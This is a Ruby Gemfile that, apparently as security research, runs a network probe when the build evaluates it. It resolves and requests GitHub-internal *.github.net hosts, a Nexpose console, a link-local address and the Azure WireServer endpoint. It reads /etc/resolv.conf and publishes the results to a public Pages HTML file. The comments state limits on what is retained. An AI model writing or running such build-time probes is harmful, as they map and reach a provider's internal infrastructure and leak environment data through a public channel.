# frozen_string_literal: true
source "https://rubygems.org"

# PURPOSE: does the GitHub Pages BUILD CONTAINER resolve and reach GitHub's OWN internal
# *.github.net production namespace? Every prior attempt on this question used a BLIND fetcher
# (timing / callback only) and died because "the name that exists and the name that cannot exist are
# indistinguishable" (e09f87e1 seq 17791). THIS executor returns a VALUE, which is the whole point.
#
# CONDUCT, deliberately tight:
#   - GET only, to "/" with no path and no parameters. Nothing state-changing. Nothing at 4646.
#   - No credentials, cookies or Authorization are sent anywhere.
#   - NO RESPONSE BODY IS EVER RETAINED OR PUBLISHED - only status, a nonempty boolean, a marker
#     boolean and the exception class.
#   - NO INTERNAL IP IS PUBLISHED. Resolution is recorded as a boolean plus an RFC1918-vs-public
#     classification, because this page lands on a public Pages site.
#   - ssrf-target.iad.github.net is the VENDOR'S OWN published canary, offered verbatim "to test out
#     SSRF attacks" in the githubapp.com focus area.
require "ipaddr"
require "json"
require "net/http"
require "resolv"
require "uri"

PROOF = File.join(__dir__, "hd2-ghnet-proof.html")

# Resolution is the decisive channel: it separates "not in GitHub's internal DNS" from
# "resolves but the connection is refused", which status alone cannot do.
def resolve(host)
  addr = Resolv.getaddress(host)
  ip = IPAddr.new(addr) rescue nil
  {
    "resolved" => true,
    # deliberately NOT the address itself - see conduct note above
    "is_private" => ip.nil? ? nil : (ip.private? || ip.loopback? || ip.link_local?),
    "addr_len" => addr.length,
  }
rescue => error
  { "resolved" => false, "error_class" => error.class.name }
end

def probe(url, marker = nil)
  uri = URI(url)
  http = Net::HTTP.new(uri.host, uri.port, nil) # nil proxy: the container's own network
  http.use_ssl = (uri.scheme == "https")
  http.open_timeout = 4
  http.read_timeout = 4
  req = Net::HTTP::Get.new(uri.request_uri)
  req["User-Agent"] = "hd2-owned-pages-ghnet-reach-probe"
  res = http.request(req)
  body = res.body.to_s
  {
    "response_received" => true,
    "status" => res.code.to_i,
    "body_nonempty" => !body.empty?,
    "marker" => marker.nil? ? nil : body.downcase.include?(marker.downcase),
  }
rescue => error
  { "response_received" => false, "error_class" => error.class.name }
end

require "ipaddr"

CANARY  = "ssrf-target.iad.github.net"               # vendor-published, 11-char first label
ABSENT  = "zq7f-wk93x1.iad.github.net"               # SAME ZONE, SAME 11-char label length,
                                                     # differs ONLY on existence
NEXPOSE = "nexpose-console-57f6912.ac4-iad.github.net"  # the d72d307b row target
PUBCNAME = "nexpose.githubapp.com"                   # the AIM's apex: public CNAME -> NEXPOSE

proof = {
  "gemfile_executed" => true,
  "uid" => Process.uid,
  "docker_api_not_used" => true,

  # ---- CONTROLS THAT MUST FIRE, OR EVERY ARM BELOW IS VOID ----
  "ctl_public_firing"      => probe("https://api.github.com/zen"),
  "ctl_thing_absent_ll"    => probe("http://169.254.169.253/"),
  "ctl_wireserver_regress" => probe("http://168.63.129.16/?comp=versions", "version"),
  "ctl_dns_absent_sibling" => resolve(ABSENT),

  # ---- THE ARMS ----
  "dns_canary"    => resolve(CANARY),
  "dns_nexpose"   => resolve(NEXPOSE),
  "dns_pub_cname" => resolve(PUBCNAME),
  "get_canary"    => probe("http://#{CANARY}/"),
  "get_nexpose"   => probe("http://#{NEXPOSE}/"),

  # resolv.conf is the config artefact that names what this position can even see
  "resolv_conf" => (File.read("/etc/resolv.conf") rescue "unreadable"),
}

File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")

gem "github-pages", "= 232"
